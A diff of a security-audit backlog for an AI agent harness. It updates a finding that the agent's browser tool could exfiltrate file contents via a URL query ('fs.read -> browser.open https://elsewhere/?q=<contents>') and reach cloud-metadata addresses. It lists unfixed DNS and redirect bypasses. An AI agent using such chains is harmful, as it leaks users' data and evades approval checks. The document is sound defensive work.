@@ -154,11 +154,39 @@ is one approved command away, and the model key is already in the environment.
 *Durable fix:* `env_clear` plus an explicit allowlist. The crate-graph invariant is real and worth
 keeping; it just does not deliver what its own message claims while the process boundary leaks.
 
-### T2-3 — `browser.open` is an unprompted exfiltration primitive. `open`
-`P1` · reach: all users · `reports/guest-tools.md` F-GT3
+### T2-3 - `browser.open` is an unprompted exfiltration primitive. `partly done`
+`P1` - reach: all users - `reports/guest-tools.md` F-GT3
 
-Allow-listed, any URL, no approval. Also a loopback SSRF reach. And `browser.screenshot` silently
-overwrites any workspace file while `fs.write` asks.
+**Done, in two commits.** `0260362` made `browser.open` `ask` and scoped "allow for the session" to
+the one origin the hub derives from the URL it is about to forward, which closed the
+`fs.read` -> `browser.open https://elsewhere/?q=<contents>` chain needing no prompt. This commit adds
+the hard refusal for destinations that are not on the public internet: a literal address in a
+loopback, link-local, private or cloud-metadata range is denied with no prompt at all, ahead of every
+rule and every grant, so no approval and no session grant lifts it.
+
+Parsed with the `url` crate's `Host` enum, which is what makes the numeric spellings decidable:
+decimal, hex and octal IPv4, IPv4-mapped IPv6, and userinfo all resolve to a value this can check,
+where a string test would pass every one of them. `localhost` and `*.localhost` are refused by
+name, because RFC 6761 reserves them for loopback. Opt out with
+`BOTROSTER_ALLOW_PRIVATE_BROWSER_OPEN=1`, which lifts the refusal and not the approval.
+
+**Still open, and both are the reason this is not `done`:**
+
+- **DNS is not resolved.** A hostname that resolves to `10.0.0.1` or `169.254.169.254` passes this
+  check, because the check sees names rather than addresses. Closing it means resolving the host and
+  checking every answer, in the hub, at call time - which is a decision about TOCTOU, about which
+  resolver, and about what to do when one answer is public and another is not.
+- **Redirects are not inspected.** A public origin that answers `302` to a metadata address is
+  followed, and the second URL is never checked. Closing it means following the redirect in the hub
+  and re-checking, or refusing to follow one that leaves the approved origin at all.
+
+Neither is a policy detail. Both want an **egress filter in front of the browser**, so that the
+decision is made on the connection rather than on a string the caller supplied. That is a separate
+and larger piece of work than anything in this backlog item, and the code comments and the README say
+so rather than implying the refusal is network containment.
+
+**Also still open from F-GT3, untouched here:** `browser.screenshot` silently overwrites any
+workspace file with PNG bytes, with no prompt, while `fs.write` asks.
 
 ### T2-4 — Chrome's own sandbox was disabled by a false premise. `done 6f477d4`
 `P0` · reach: all users — **fixed.** Opt-in via `BOTROSTER_BROWSER_NO_SANDBOX=1`; 19 live browser
